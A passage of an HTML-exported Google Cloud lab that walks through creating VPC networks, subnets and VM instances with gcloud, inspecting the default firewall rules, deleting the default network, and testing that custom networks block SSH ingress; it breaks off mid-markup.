style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - @.com (active)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h4 id='task-1-create-vpc-networks-and-instances'><span>Task 1. Create VPC networks and instances</span></h4><p><span>In this task, you create an automatic VPC network and custom VPC network, and some initial VPC instances in those networks.</span></p><ol start='' ><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>) to open Cloud Shell. If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>To create the network </span><em><span>mynetwork</span></em><span> with auto subnets, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create mynetwork --subnet-mode=auto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.</span></p><p><span>You will now create a network with custom subnets. You can choose any private RFC 1918 CIDR block for the primary IP address range of the subnets.</span></p><ol start='' ><li><p><span>To create the network </span><em><span>privatenet</span></em><span> with custom subnets, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create privatenet \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet-mode=custom</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To create a custom subnet in the privatenet network, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create privatesubnet \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=privatenet --region=Region \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--range=10.0.0.0/24 --enable-private-ip-google-access</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To create some instances to use later for testing in all networks, run these commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=Zone 1 --network=default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create mynet-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=Zone 1 --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create mynet-vm-2 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=Zone 2 --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create privatenet-bastion \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=Zone  --subnet=privatesubnet --can-ip-forward</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create privatenet-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=Zone  --subnet=privatesubnet</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create VPC networks and instances</span></p><p>&nbsp;</p><h4 id='task-2-investigate-the-default-network'><span>Task 2. Investigate the default network</span></h4><p><span>In this task, you explore the default network and verify that the default-allow-ssh firewall rule is working. Later, you delete the default-vm-1 instance and default network because you no longer need it.</span></p><p><span>Return to the Cloud Console and view the firewall rules.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span></p></li></ol><p><span>The following four default rules are created for the default network:</span></p><p><img src="https://cdn.qwiklabs.com/%2B3rX%2BBQoV4F%2Fs0b%2BSi9SndCb%2BjMo60W8vKASrh9dXL4%3D" referrerpolicy="no-referrer" alt="Four default firewall ingress rules"></p><p><span>Remember, all networks also have the following 2 rules, which are not displayed in the console:</span></p><p><img src="https://cdn.qwiklabs.com/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D" referrerpolicy="no-referrer" alt="Default deny all ingress and default deny all egress rules"></p><p><span>To check that the default-allow-ssh firewall rule is working, ssh into the default-vm-1 instance in the default network and test it.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span> to display a list of VM instances.</span></p></li><li><p><span>In the row for the </span><strong><span>default-vm-1</span></strong><span> instance, click </span><strong><span>SSH</span></strong><span>.</span></p></li></ol><p><span>You should connect successfully via SSH to the instance because of the default-allow-ssh rule. You can ping </span><code>www.google.com</code><span> to test the egress connectivity. Press </span><strong><span>Ctrl+C</span></strong><span> to stop the ping.</span></p><h5 id='delete-the-default-vm-1-instance'><span>Delete the default-vm-1 instance</span></h5><p><span>Now delete the default-vm-1 instance because you no longer need it.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>, select the </span><strong><span>default-vm-1</span></strong><span> instance and then click </span><strong><span>Delete</span></strong><span>.</span></p></li><li><p><span>In the confirmation box, click </span><strong><span>Delete</span></strong><span>.</span></p></li></ol><h5 id='delete-the-default-network'><span>Delete the default network</span></h5><p><strong><span>Note:</span></strong><span> Because the default network allows relatively open access, we recommend that you delete it for production projects.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; VPC networks</span></strong><span> to display the list of VPC networks in the Cloud Console.</span></p></li><li><p><span>Click the </span><strong><span>default</span></strong><span> network to view the network details.</span></p></li><li><p><span>Click </span><strong><span>Delete VPC Network</span></strong><span>.</span></p></li><li><p><span>In the confirmation box, click </span><strong><span>Delete</span></strong><span>.</span></p></li><li><p><span>Wait for the network to be deleted and verify that the default network is no longer displayed on the VPC Networks page.</span></p></li></ol><h4 id='task-3-investigate-the-user-created-networks'><span>Task 3. Investigate the user-created networks</span></h4><p><span>In this task, you explore the user-created networks to verify no ingress is allowed without custom firewall rules.</span></p><h5 id='verify-that-no-ingress-is-allowed-without-custom-firewall-rules'><span>Verify that no ingress is allowed without custom firewall rules</span></h5><p><span>Remember, all networks have the following 2 rules (which will not be displayed in the Console) to block all incoming traffic and allow all outgoing traffic. Unlike the default network, user-created networks do not have any other rules by default, so currently no inbound traffic is allowed.</span></p><p><img src="https://cdn.qwiklabs.com/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D" referrerpolicy="no-referrer" alt="Default deny all ingress and default deny all egress rules"></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span> to display a list of VM instances.</span></p></li><li><p><span>In the row for </span><strong><span>mynet-vm-1</span></strong><span> or </span><strong><span>mynet-vm-2</span></strong><span>, click </span><strong><span>SSH</span></strong><span>.</span></p></li></ol><p><span>You should </span><strong><span>NOT</span></strong><span> be able to connect via SSH to the instances.</span></p><p><span>You will now try to SSH into an instance from the Cloud Shell.</span></p><ol start='' ><li><p><span>Switch back to or reopen Cloud Shell.</span></p></li><li><p><span>To try to ssh into the </span><strong><span>mynet-vm-2</span></strong><span> instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" 